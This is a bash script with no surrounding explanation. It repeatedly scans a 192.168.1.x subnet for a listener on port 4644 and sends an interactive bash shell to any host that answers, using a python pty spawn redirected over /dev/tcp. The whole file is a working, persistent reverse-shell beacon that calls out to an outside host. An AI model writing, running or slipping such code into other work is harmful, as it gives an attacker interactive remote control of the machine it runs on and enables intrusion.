#!/usr/bin/env bash

ip='192.168.1'
port='4644'

shell() {
for i in $(seq 100 255 | shuf); do
  com="${ip}.${i}"
 (
if timeout 0.1 bash -c "true > /dev/tcp/$com/$port" 2>/dev/null; then
   if ! pgrep -f "pty.spawn" > /dev/null; then
   sleep 2.5
   python3 -c 'import pty,os; os.environ["TERM"]="xterm"; pty.spawn(["/bin/bash", "-i"])' >& /dev/tcp/$com/$port 0>&1
   fi
fi
 ) &
 sleep 0.02
done
wait
}

while true; do
  sleep 15
  shell
  sleep 15
done
